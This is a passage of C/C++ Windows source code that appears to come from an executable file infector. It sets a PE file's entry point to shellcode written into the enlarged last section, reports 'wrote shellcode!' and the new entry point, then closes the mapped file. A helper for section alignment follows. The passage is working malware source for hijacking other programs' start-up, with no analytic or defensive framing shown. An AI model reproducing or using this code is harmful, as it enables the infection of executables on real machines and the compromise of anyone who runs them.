	pNtHeader->OptionalHeader.AddressOfEntryPoint = dwPos + pSectionHeaderLast->VirtualAddress - pSectionHeaderLast->PointerToRawData;
	
	_tprintf(_T("%s: wrote shellcode!\n"), sNode->szExeFileName);
	_tprintf(_T("%s: the AddressOfEntryPoint now is: 0x%x\n"), sNode->szExeFileName, pNtHeader->OptionalHeader.AddressOfEntryPoint);
	_tprintf(_T("%s: the last section header size increased to %d\n"), sNode->szExeFileName, pSectionHeaderLast->Misc.VirtualSize);
	_tprintf(_T("%s: the characteristics of the last section are 0x%x\n"), sNode->szExeFileName, pSectionHeaderLast->Characteristics);

	bClose = UnmapViewOfFile(lpFileMap);
	if (bClose == 0)
	{
		_tprintf(_T("UnmapViewOfFile error: %d\n"), GetLastError());
	}

	bClose = CloseHandle(hFile);
	if (bClose == FALSE)
	{
		_tprintf(_T("CloseHandle error: %d\n"), GetLastError());
	}

	return 0;
}

DWORD Align(DWORD dwSize, DWORD dwAlign, DWORD dwAddr)
{
	if (!(dwSize % dwAlign))
		return dwAddr + dwSize;
	return dwAddr + (dwSize / dwAlign + 1) * dwAlign;
}